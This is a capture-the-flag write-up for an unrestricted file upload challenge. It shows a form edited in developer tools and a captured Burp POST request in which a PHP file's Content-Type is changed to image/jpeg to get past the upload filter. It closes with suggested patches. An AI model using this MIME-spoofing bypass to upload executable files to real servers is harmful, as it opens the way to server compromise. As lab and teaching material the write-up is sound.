# [Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)

## Writeup

Navigating to the image upload service on route `/page=upload`, we have a form asking for an image. Attempting to upload any file, even valid images, fails and we get a error stating that our file failed to upload.

Using the developer tools, we can change the innerhtml of the form to accept mime types of common image types.
Old Form:
```html
<form enctype="multipart/form-data" action="#" method="POST">
	<input type="hidden" name="MAX_FILE_SIZE" value="100000">
	Choose an image to upload:
	<br>
	<input name="uploaded" type="file"><br>
	<br>
	<input type="submit" name="Upload" value="Upload">
</form>
```
New Form:
```html 
<form enctype="multipart/form-data" action="#" method="POST">
	<input type="hidden" name="MAX_FILE_SIZE" value="100000">
	Choose an image to upload:
	<br>
	<!-- Edit HERE -->
	<input name="uploaded" type="file" accept="image/jpeg"><br> 
	<!-- Edit HERE -->
	<br>
	<input type="submit" name="Upload" value="Upload">
</form>

```

We can now image types of whatever we specify, however if we attempt to upload a mime type that is not an image like `text/php`, we fail to upload the file.

Let's use burp to hide a php file behind a valid mime type. Using burp's builtin browser, we navigate to the route, turn on the interceptor, and upload a test file like `script.php`. The interceptor catches the outgoing POST request:
```
POST /?page=upload HTTP/1.1
Host: 10.13.249.200
Content-Length: 391
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.13.249.200
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryg4imGYVBT4mAKy0D
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.13.249.200/?page=upload
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundaryg4imGYVBT4mAKy0D
Content-Disposition: form-data; name="MAX_FILE_SIZE"

100000
------WebKitFormBoundaryg4imGYVBT4mAKy0D
Content-Disposition: form-data; name="uploaded"; filename="script.php"
Content-Type: text/php


------WebKitFormBoundaryg4imGYVBT4mAKy0D
Content-Disposition: form-data; name="Upload"

Upload
------WebKitFormBoundaryg4imGYVBT4mAKy0D--
```
Now we can just edit the request in burp by changing the content type of the uploaded file from `text/php` to `image/jpeg`. Forwarding the request, we can check back in the browers to see the flag.

## Possible Patches

Here are a few ways to prevent Unrestricted File Upload:
 1. Scan file contents instead of just the mimetype. 
 1. Removing control or special unicode character from file names/extensions.
 1. Ensure files can't be overwriten by files being uploaded.
 1. Uploaded files shouldn't be executable or interperted by a CGI, common html control characters should be encoded.
 